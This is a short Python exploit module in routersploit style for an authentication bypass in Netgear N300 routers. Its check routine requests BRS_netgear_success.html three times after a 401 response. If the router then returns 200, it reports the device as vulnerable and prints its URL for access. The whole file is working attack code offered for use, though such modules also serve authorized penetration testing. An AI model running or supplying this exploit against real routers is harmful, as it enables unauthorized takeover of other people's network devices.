# rsf exploit module
# title: Netgear N300 Auth Bypass
# description: Exploits authentication bypass in Netgear N300 devices.
# author: ediop3

import requests

class Exploit:
    def __init__(self):
        self.target = ""
        self.port = 80
        self.session = requests.Session()

    def run(self):
        if self.check():
            print("[+] Target is vulnerable")
            print(f"[*] Visit: http://{self.target}:{self.port}/")
        else:
            print("[-] Target seems to be not vulnerable")

    def check(self):
        try:
            response = self.session.get(f"http://{self.target}:{self.port}/", timeout=5)
            if response is None:
                return False

            if response.status_code == 401:
                for _ in range(3):
                    try:
                        self.session.get(f"http://{self.target}:{self.port}/BRS_netgear_success.html", timeout=5)
                    except:
                        return False

                try:
                    final_resp = self.session.get(f"http://{self.target}:{self.port}/", timeout=5)
                    return final_resp.status_code == 200
                except:
                    return False
        except:
            pass
        return False
